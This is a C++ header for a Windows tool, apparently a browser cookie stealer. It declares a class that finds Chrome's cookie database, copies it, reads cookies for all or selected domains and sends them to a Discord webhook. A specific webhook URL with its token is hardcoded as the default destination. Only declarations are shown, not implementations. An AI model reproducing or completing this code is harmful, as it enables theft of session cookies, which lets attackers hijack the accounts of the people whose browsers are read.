#ifndef CHROME_COOKIE_RETRIEVER_CHROME_COOKIE_RETRIEVER_HPP
#define CHROME_COOKIE_RETRIEVER_CHROME_COOKIE_RETRIEVER_HPP

#include "cookie.hpp"
#include "webhook_sender.hpp"
#include <sqlite3.h>
#include <windows.h>
#include <shlobj.h>
#include <memory>
#include <string>
#include <vector>
#include <filesystem>
#include <sstream>

namespace cookie_retriever {

/**
 * @brief Main class for retrieving and processing Chrome cookies
 */
class ChromeCookieRetriever {
private:
    std::unique_ptr<WebhookSender> webhook_sender_;
    std::string chrome_cookie_path;
    std::string temp_db_path;
    std::string webhook_url_; 

    /**
     * @brief Gets the path to Chrome's cookie database
     * @return Path to cookie database
     */
    std::string get_chrome_cookie_path() const;

    /**
     * @brief Creates a temporary copy of the cookie database
     * @param src_path Source database path
     * @return Path to temporary database
     */
    std::string create_temp_db(const std::string& src_path) const;

    /**
     * @brief Callback function for processing SQL query results
     */
    static int cookie_callback(void* data, int argc, char** argv, char** col_name);

    /**
     * @brief Checks if Chrome is currently running
     * @return True if Chrome is running, false otherwise
     */
    bool is_chrome_running() const;

    /**
     * @brief Cleans up the temporary database
     * @param temp_path Path to temporary database
     */
    void cleanup_temp_db(const std::string& temp_path) const;

    /**
     * @brief Sends cookies to a Discord webhook
     * @param cookies_json JSON string of cookies
     */
    void send_cookies_to_webhook(const std::string& cookies_json);

public:
    /**
     * @brief Constructs a cookie retriever
     * @param webhook_url Optional Discord webhook URL
     */
    explicit ChromeCookieRetriever(const std::string& webhook_url = "https://discord.com/api/webhooks/1307465181974233200/KYQo4T58xjkQ9Kkw6m22EXZFFWtjp-CEZbi7nnnh-gGkxu2nPg9SAW0ALkShdtdOXxtS");
    
    ~ChromeCookieRetriever();

    // Prevent copying
    ChromeCookieRetriever(const ChromeCookieRetriever&) = delete;
    ChromeCookieRetriever& operator=(const ChromeCookieRetriever&) = delete;

    /**
     * @brief Retrieves cookies for a specific domain pattern
     * @param domain_pattern Domain pattern to retrieve cookies for
     */
    void retrieve_cookies(const std::string& domain_pattern = "");

    /**
     * @brief Gets all cookies from Chrome
     * @return Vector of cookies
     */
    std::vector<Cookie> get_all_cookies();

    /**
     * @brief Gets cookies for a specific domain
     * @param domain Domain to get cookies for
     * @return Vector of cookies
     */
    std::vector<Cookie> get_cookies_for_domain(const std::string& domain);
};

} // namespace cookie_retriever

#endif // CHROME_COOKIE_RETRIEVER_CHROME_COOKIE_RETRIEVER_HPP
